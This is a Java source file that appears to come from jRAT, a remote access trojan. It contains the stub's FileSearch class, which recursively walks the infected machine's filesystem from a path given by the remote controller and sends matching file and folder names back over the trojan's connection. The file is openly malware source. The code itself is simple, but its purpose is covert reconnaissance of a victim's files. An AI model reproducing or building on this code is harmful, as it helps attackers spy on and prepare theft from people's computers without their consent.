package io.jrat.stub;

import io.jrat.stub.packets.outgoing.Packet37SearchResult;
import java.io.File;


public class FileSearch extends Thread {

	private static boolean running;

	private Connection con;
	private String start;
	private String name;
	private boolean dir;

	public FileSearch(Connection con, String start, String name, boolean dir) {
		this.con = con;
		this.start = start;
		this.name = name;
		this.dir = dir;
	}

	public void run() {
		running = true;
		try {
			search(start.equals(File.separator) || start.toLowerCase().startsWith("%root%") ? File.listRoots()[0].getAbsolutePath() : start);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void search(String parentDirectory) throws Exception {
		File[] filesInDirectory = new File(parentDirectory).listFiles();

		if (filesInDirectory != null) {
			for (File f : filesInDirectory) {
				if (!running) {
					return;
				}
				if (f.isDirectory()) {
					search(f.getAbsolutePath());
				}
				if (dir && f.getAbsolutePath().replace(f.getName(), "").toLowerCase().contains(name.toLowerCase()) || f.getName().toLowerCase().contains(name.toLowerCase())) {
					con.addToSendQueue(new Packet37SearchResult(f.getParent(), f.getName(), f.isDirectory()));
				}
			}
		}

	}
	
	public static boolean isRunning() {
		return running;
	}
	
	/**
	 * Will quickly halt searching in case of interrupted connection etc
	 */
	public static void stopSearch() {
		running = false;
	}

}
